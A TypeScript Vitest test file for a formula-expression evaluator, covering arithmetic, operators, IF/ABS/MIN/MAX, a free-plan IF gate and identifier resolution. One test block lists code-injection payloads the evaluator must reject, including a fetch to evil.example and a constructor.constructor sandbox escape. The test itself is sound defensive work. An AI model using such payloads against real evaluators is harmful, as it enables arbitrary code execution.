import { describe, expect, test } from 'vitest';
import {
  evaluateFormulaExpression,
  parseFormulaExpression,
} from './FormulaEvaluator';

describe('arithmetic', () => {
  test('respects operator precedence', () => {
    expect(evaluateFormulaExpression('1 + 2 * 3')).toBe(7);
  });

  test('parentheses override precedence', () => {
    expect(evaluateFormulaExpression('(1 + 2) * 3')).toBe(9);
  });

  test('divides to fractional results', () => {
    expect(evaluateFormulaExpression('10 / 4')).toBe(2.5);
  });

  test('supports modulo', () => {
    expect(evaluateFormulaExpression('7 % 4')).toBe(3);
  });

  test('unary minus', () => {
    expect(evaluateFormulaExpression('-5 + 3')).toBe(-2);
  });

  test('division by zero yields Infinity (caller maps to error)', () => {
    expect(evaluateFormulaExpression('1 / 0')).toBe(Infinity);
  });

  test('0/0 yields NaN (caller maps to error)', () => {
    expect(evaluateFormulaExpression('0 / 0')).toBeNaN();
  });
});

describe('numbers', () => {
  test('decimal and leading-dot literals', () => {
    expect(evaluateFormulaExpression('0.5 + .5')).toBe(1);
  });

  test('scientific notation', () => {
    expect(evaluateFormulaExpression('1e3 + 1')).toBe(1001);
  });
});

describe('power operator', () => {
  test('^ is exponentiation', () => {
    expect(evaluateFormulaExpression('2 ^ 3')).toBe(8);
  });

  test('** is accepted (pre-replaced legacy form)', () => {
    expect(evaluateFormulaExpression('2 ** 3')).toBe(8);
  });

  test('right-associative', () => {
    expect(evaluateFormulaExpression('2 ^ 3 ^ 2')).toBe(512);
  });

  test('power binds tighter than unary minus', () => {
    expect(evaluateFormulaExpression('-2 ^ 2')).toBe(-4);
  });

  test('unary minus allowed in exponent', () => {
    expect(evaluateFormulaExpression('2 ^ -1')).toBe(0.5);
  });
});

describe('comparisons', () => {
  test.each([
    ['3 > 2', true],
    ['2 >= 3', false],
    ['2 < 3', true],
    ['3 <= 2', false],
    ['1 == 1', true],
    ['1 != 2', true],
    ['1 === 1', true],
    ['1 !== 1', false],
  ])('%s -> %s', (src, expected) => {
    expect(evaluateFormulaExpression(src)).toBe(expected);
  });
});

describe('logical operators', () => {
  test('AND returns operand like JS &&', () => {
    expect(evaluateFormulaExpression('1 AND 0')).toBe(0);
  });

  test('OR returns first truthy operand like JS ||', () => {
    expect(evaluateFormulaExpression('0 OR 5')).toBe(5);
  });

  test('keywords are case-insensitive', () => {
    expect(evaluateFormulaExpression('1 and 2')).toBe(2);
  });

  test('&& and || symbols accepted', () => {
    expect(evaluateFormulaExpression('1 && 2 || 0')).toBe(2);
  });

  test('! negates truthiness', () => {
    expect(evaluateFormulaExpression('!(1 > 2)')).toBe(true);
  });

  test('AND binds tighter than OR', () => {
    expect(evaluateFormulaExpression('1 OR 0 AND 0')).toBe(1);
  });
});

describe('functions', () => {
  test('IF picks the then-branch on truthy condition', () => {
    expect(evaluateFormulaExpression('IF(1 > 0, 10, 20)')).toBe(10);
  });

  test('IF picks the else-branch on falsy condition', () => {
    expect(evaluateFormulaExpression('IF(0, 1, 2)')).toBe(2);
  });

  test('IF with two args yields undefined else-branch (legacy parity)', () => {
    expect(evaluateFormulaExpression('IF(0, 1)')).toBeUndefined();
  });

  test('function names are case-insensitive', () => {
    expect(evaluateFormulaExpression('if(1, 2, 3)')).toBe(2);
  });

  test('ABS', () => {
    expect(evaluateFormulaExpression('ABS(-5)')).toBe(5);
  });

  test('MIN is variadic', () => {
    expect(evaluateFormulaExpression('MIN(3, 1, 2)')).toBe(1);
  });

  test('MAX is variadic', () => {
    expect(evaluateFormulaExpression('MAX(3, 1, 2)')).toBe(3);
  });

  test('nested calls', () => {
    expect(evaluateFormulaExpression('MAX(ABS(-10), MIN(5, 3))')).toBe(10);
  });

  test('ABS requires exactly one argument', () => {
    expect(() => evaluateFormulaExpression('ABS(1, 2)')).toThrow();
  });

  test('unknown function call throws', () => {
    expect(() => evaluateFormulaExpression('SQRT(4)')).toThrow();
  });
});

describe('FREEPLAN gate', () => {
  test('IF throws the freeplan message when allowIf is false', () => {
    expect(() =>
      evaluateFormulaExpression('IF(1, 2, 3)', { allowIf: false })
    ).toThrow('IF() is not available in the free plan');
  });

  test('other functions unaffected by allowIf', () => {
    expect(evaluateFormulaExpression('ABS(-1)', { allowIf: false })).toBe(1);
  });
});

describe('identifiers', () => {
  test('resolved through the provided resolver', () => {
    const resolve = (name: string) => (name === 'revenue' ? 10 : null);
    expect(
      evaluateFormulaExpression('revenue * 2', { resolveIdentifier: resolve })
    ).toBe(20);
  });

  test('resolver returning null coerces to 0 (legacy parity)', () => {
    expect(
      evaluateFormulaExpression('missing + 1', {
        resolveIdentifier: () => null,
      })
    ).toBe(1);
  });

  test('identifier without resolver throws', () => {
    expect(() => evaluateFormulaExpression('revenue * 2')).toThrow(
      /unknown identifier/i
    );
  });
});

describe('injection attempts are rejected', () => {
  test.each([
    '(() => { globalThis.pwned = 1 })()',
    "fetch('http://evil.example')",
    "constructor.constructor('return 1')()",
    '[].map',
    '1; globalThis.pwned = 2',
    'a`b`',
    "'str' + 1",
    '({}).toString()',
    'new Date()',
    '1 = 2',
  ])('%s throws', (src) => {
    expect(() =>
      evaluateFormulaExpression(src, { resolveIdentifier: () => 1 })
    ).toThrow();
    expect((globalThis as Record<string, unknown>).pwned).toBeUndefined();
  });
});

describe('malformed input', () => {
  test.each(['', '   ', '1 +', '(1 + 2', '1 2', '* 3', 'IF(1, 2, 3, 4)'])(
    '%j throws',
    (src) => {
      expect(() => evaluateFormulaExpression(src)).toThrow();
    }
  );
});

describe('parseFormulaExpression (validation mode)', () => {
  test('accepts unknown identifiers without a resolver', () => {
    expect(() => parseFormulaExpression('revenue + sum * 2')).not.toThrow();
  });

  test('accepts the full grammar', () => {
    expect(() =>
      parseFormulaExpression('IF(a > 1 AND b <= 2, ABS(-1) ^ 2, MIN(0, 1))')
    ).not.toThrow();
  });

  test('rejects syntax errors', () => {
    expect(() => parseFormulaExpression('1 + * 2')).toThrow();
  });

  test('rejects statements', () => {
    expect(() => parseFormulaExpression('while(1){}')).toThrow();
  });
});
